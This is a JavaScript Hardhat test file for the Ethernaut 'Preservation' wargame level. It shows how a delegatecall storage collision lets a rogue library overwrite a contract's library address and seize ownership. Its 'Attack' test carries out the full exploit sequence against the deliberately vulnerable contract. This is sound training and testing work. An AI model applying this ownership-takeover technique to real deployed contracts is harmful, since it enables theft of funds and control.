const { expect } = require("chai");
const { ethers, waffle} = require("hardhat");
const provider = waffle.provider;
const utils = require("../scripts/lib/utils");

async function getStoredTime(addr) {
    return parseInt(await provider.getStorageAt(addr, 3));
}

describe("Ethernaut Preservation", function () {
    let contract, brokenLib, fixedLib, attackLib;   //contracts
    let owner, addr1;                               //accounts
    
    beforeEach(async function () {
        [owner, addr1, ...addrs] = await ethers.getSigners();
        
        //deploy contracts
		brokenLib = await utils.deployContractSilent("LibraryContract");
		fixedLib = await utils.deployContractSilent("FixedTimeLibrary");
		attackLib = await utils.deployContractSilent("ImpostorLibrary");
		contract = await utils.deployContractSilent("Preservation", [brokenLib.address, fixedLib.address]);
    });
    
    describe("Normal function", function () {
        it("original library doesn't function as expected", async function () {
            //we set time as 777, but stored time is 0
            await contract.setFirstTime(777);
            expect(await getStoredTime(contract.address)).to.be.equal(0);
            
            //we set time as 11, but stored time is 0
            await contract.setFirstTime(11);
            expect(await getStoredTime(contract.address)).to.be.equal(0);
        });
        
        it("fixed library functions as expected", async function () {
            //we set time as 777, and stored time is 777
            await contract.setSecondTime(777);
            expect(await getStoredTime(contract.address)).to.be.equal(777);
            
            //we set time as 11, and stored time is 11
            await contract.setSecondTime(11);
            expect(parseInt(await provider.getStorageAt(contract.address, 3))).to.be.equal(11);
            expect(await getStoredTime(contract.address)).to.be.equal(11);
        });
        
        it("original library modifies first memory slot", async function () {
            //we expect the first mem slot to have the time zone library 
            expect(await contract.timeZone1Library()).to.be.equal(brokenLib.address);
            
            //now invoke that library, passing owner address 
            await contract.setFirstTime(owner.address); 
            
            //the first mem slot in contract has now been modified
            expect(await contract.timeZone1Library()).to.be.equal(owner.address);
        });
    });
    
    describe("Attack", function () {
        it("claim ownership of contract through bogus library", async function () {
            //check ownership first 
            expect(await contract.owner()).to.be.equal(owner.address);
            
            //invoke library via contract, passing address of attack library as argument
            //this will set the first library to be our attack library 
            await contract.setFirstTime(attackLib.address);
            
            //now invoke the attack library, passing address of new owner as argument
            await contract.setFirstTime(addr1.address);
            
            //now addr1 should be owner 
            expect(await contract.owner()).to.be.equal(addr1.address);
        });
    });
});